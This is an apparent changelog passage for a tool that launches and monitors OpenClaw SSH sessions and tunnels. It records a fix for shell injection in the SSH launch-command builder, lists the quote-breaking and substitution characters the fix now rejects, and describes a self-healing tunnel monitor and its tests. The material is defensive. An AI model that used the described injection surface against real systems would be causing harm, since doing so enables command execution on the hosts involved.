- **OpenClaw session-launch command shape-validates its fields too — completes the injection sweep (#316).** `_buildLaunchCommand` (`lib/sessions.js`) built the engine-launch string `ssh -t -i <key> <user>@<host> "<cliCommand>"` from stored connection fields with no validation, and the key path was **unquoted**. It now refuses to launch (returns `undefined` + logs) when `host`/`sshUser`/`sshKeyPath` fail the shared `unsafeReason` guard, rejects a `cliCommand` containing quote-breaking / substitution characters (`"` `` ` `` `$` `\` or control chars — while still allowing plain flags), and quotes the key path. This was the launch-path sibling of #312/#314 and the last known shell-injection surface in the OpenClaw flow. **Tests.** New OpenClaw-launch cases in `test/sessions.test.js` (safe build, refused on injection-shaped host/sshUser/sshKeyPath/cliCommand, plain-flag cliCommand still allowed).

## [3.25.0] - 2026-06-02

### Added

- **OpenClaw tunnels self-heal — periodic liveness check + auto-recreate (closes #294).** A background monitor (`lib/tunnel-monitor.js`, started at server boot) end-to-end probes each tunnel TC has established this process lifetime (`oc-direct-<connId>`, every 45s via `httpRoundTrip`) and rebuilds any that died via `ensureTunnel({force:true})` — re-resolving the connection config and re-picking the IPv4/IPv6 forward target (#291). This fixes the "tunnel connects, then doesn't persist → Web UI black-screens" loop: when an `ssh -f -N -L` tunnel dropped (transport flap, or the remote gateway container being restarted) nothing rebuilt it, so the connection stayed dead until a manual re-launch. Per-connection **exponential backoff** (45s → capped 10min) keeps a genuinely-down gateway from hot-looping and clears the moment a probe succeeds. Scope is intentionally narrow: only currently-tracked `oc-direct` tunnels (ones the operator opened) are monitored — never auto-establishing a tunnel nobody asked for. The interval is `unref`'d (never holds the process open) and `stop()`ped on graceful shutdown. A **2-consecutive-failed-probe debounce** keeps a lone transient timeout from tearing down an otherwise-healthy tunnel, and an **in-flight guard** ensures overlapping ticks can't race a teardown/rebuild of the same local port (a recreate's ssh spawn can outlast the interval). **Tests.** New `test/tunnel-monitor.test.js` (11): key parsing, healthy→no-rebuild, the probe debounce (1st miss → "probing", 2nd → recreate), dead→recreate-with-force+bridge-forward, recreate-failure→backoff→skip-in-window, backoff escalation + cap, recovery-clears-backoff, `tick` filters to known oc-direct connections, the reentrancy guard (a 2nd tick is a no-op while one is in flight), start-idempotent/stop-clears. Full suite 2677/2678 (1 pre-existing skip).

## [3.24.0] - 2026-06-02

### Added
